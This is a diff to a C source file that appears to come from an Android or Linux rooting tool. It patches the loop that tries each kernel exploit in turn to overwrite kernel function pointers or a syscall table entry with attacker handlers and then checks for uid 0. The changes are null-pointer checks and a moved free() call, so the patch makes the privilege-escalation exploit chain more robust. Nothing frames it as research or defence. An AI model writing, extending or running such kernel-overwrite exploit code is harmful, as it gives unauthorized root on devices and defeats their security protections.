@@ -317,6 +317,7 @@ static int root_write_value_at(exploit_t *bgn, exploit_t **end, long addr, long 
     rc = kernel_vaddr_get(&kva, &kvs);
     if (rc < 0)
         mm = 0;
+    rc = -1;
     for (exp = bgn; exp->name; exp++) {
         if (!exp->write32 && !exp->mmap) {
             LOGV("ignored `%s`.", exp->name);
@@ -389,11 +390,11 @@ static int root_fops(root_ctx *ctx) {
     ptr += 56;
     // call each exp
     rc = -1;
-    for (bgn = ctx->exploits; bgn->name; bgn = next) {
+    for (bgn = ctx->exploits; bgn && bgn->name; bgn = next) {
         /* the exploit must be capable to write kernel BSS/data */
         rc = root_write_value_at(bgn, &next, ptr, (long) root_core_fsync, -1);
         if (rc) {
-            if (next->name) {
+            if (next && next->name) {
                 continue;
             } else {
                 LOGD("root_write_value_at() failed.");
@@ -446,12 +447,12 @@ static int root_syscall(root_ctx *ctx) {
         return -1;
     // call each exp
     rc = -1;
-    for (bgn = ctx->exploits; bgn->name; bgn = next) {
+    for (bgn = ctx->exploits; bgn && bgn->name; bgn = next) {
         /* the exploit must be capable to write kernel text */
         rc = root_write_value_at(bgn, &next, ptr + __NR_victim * 4, (long) root_core_syscall, EXPLOIT_POKE_TEXT);
         //rc = root_write_value_at(bgn, &next, &test, 0x12345678, EXPLOIT_POKE_TEXT);
         if (rc) {
-            if (next->name) {
+            if (next && next->name) {
                 bgn = next;
                 continue;
             } else {
@@ -484,8 +485,8 @@ static int root_invoke(root_ctx *ctx) {
                 sLSM = ctx->lsm;
                 sCFG = ctx->kconfig;
                 rc = exp->invoke(exp->opaque, (long) root_core_invoke);
+                exp->free(&exp->opaque);
             }
-            exp->free(&exp->opaque);
             if (!rc) {
                 getresuid(&uid, &euid, &suid);
                 if (!uid && !euid && !suid)
